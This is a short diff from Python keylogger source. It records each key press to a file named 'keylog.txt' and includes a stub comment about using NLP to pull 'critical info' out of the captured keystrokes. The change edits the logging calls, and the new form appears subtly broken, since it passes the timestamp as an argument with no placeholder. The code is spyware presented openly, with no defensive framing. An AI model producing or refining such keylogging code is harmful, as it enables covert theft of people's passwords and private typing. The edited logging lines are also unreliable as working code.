@@ -15,10 +15,10 @@ logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(messag
 def on_press(key):
     try:
         # Log the key pressed (character keys like a, b, 1, etc.)
-        logging.info(f"{key.char} {time}")
+        logging.info((f"{key.char}"), (f"{time}"))
     except AttributeError:
         # Handle special keys like space, enter, etc.
-        logging.info(f"{key} {time}")
+        logging.info((f"{key}"), (f"{time}"))
 
 # Define a function to process keylog data and use NLP to extract critical info
 def process_log():
